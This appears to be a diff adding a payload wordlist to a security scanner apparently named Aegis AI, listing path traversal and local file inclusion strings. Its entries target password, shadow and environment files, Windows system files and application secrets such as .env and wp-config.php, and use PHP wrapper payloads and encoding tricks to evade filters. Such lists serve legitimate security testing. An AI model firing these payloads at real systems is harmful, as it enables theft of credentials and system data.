@@ -1,0 +1,70 @@
+# ──────────────────────────────────────────────────────────────────
+# Aegis AI — Path Traversal / Local File Inclusion Payloads
+# Lines starting with # are comments. Blank lines are ignored.
+# ──────────────────────────────────────────────────────────────────
+
+# ── Classic path traversal ───────────────────────────────────────
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../etc/shadow
+../../../etc/hosts
+../../../proc/self/environ
+../../../proc/version
+
+# ── Null byte bypass ────────────────────────────────────────────
+../../../etc/passwd%00
+../../../etc/passwd%00.html
+../../../etc/passwd%00.jpg
+../../../etc/passwd%00.php
+
+# ── Double encoding ─────────────────────────────────────────────
+..%252f..%252f..%252fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+..%c0%af..%c0%af..%c0%afetc/passwd
+%252e%252e%252f%252e%252e%252fetc/passwd
+
+# ── Dot encoding ────────────────────────────────────────────────
+....//....//....//etc/passwd
+..../..../..../etc/passwd
+..%2f..%2f..%2fetc/passwd
+
+# ── Windows paths ───────────────────────────────────────────────
+..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\windows\win.ini
+..\..\..\boot.ini
+..%5c..%5c..%5cwindows%5cwin.ini
+
+# ── PHP wrappers ────────────────────────────────────────────────
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=config.php
+php://input
+expect://id
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+
+# ── Absolute paths ──────────────────────────────────────────────
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/cmdline
+/proc/self/environ
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+C:\windows\win.ini
+C:\windows\system32\drivers\etc\hosts
+
+# ── WAF evasion ──────────────────────────────────────────────────
+....\/....\/....\/etc/passwd
+..%00/..%00/..%00/etc/passwd
+..0x2f..0x2f..0x2fetc/passwd
+..%c1%1c..%c1%1c..%c1%1cetc/passwd
+
+# ── Application-specific ────────────────────────────────────────
+../../../app/config/database.yml
+../../../config/database.yml
+../../../wp-config.php
+../../../configuration.php
+../.env
+../../.env
+../../../.env
